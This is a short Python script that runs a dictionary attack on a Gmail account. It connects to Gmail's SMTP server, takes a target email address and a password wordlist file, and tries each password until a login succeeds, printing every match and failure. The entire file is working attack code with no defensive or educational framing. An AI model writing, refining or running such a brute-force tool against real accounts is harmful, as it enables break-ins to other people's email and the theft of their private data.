import smtplib

smtpserverconnectivity = smtplib.SMTP("smtp.gmail.com", 587)

smtpserverconnectivity.ehlo()

# encrypted connection using TLS
smtpserverconnectivity.starttls()


user_email_address = input(" Enter the email address to be tried = ")
password_list = input(" Enter the password file name = ")

# opening and reading the file 
password_list = open(password_list, "r")

for password_var in password_list:

	try:
		smtpserverconnectivity.login(user_email_address,password_var)
	
		print(" password match successful:  ", password_var)
		
		break

	except smtplib.SMTPAuthenticationError:
		print(" password DO NOT match :  ", password_var)

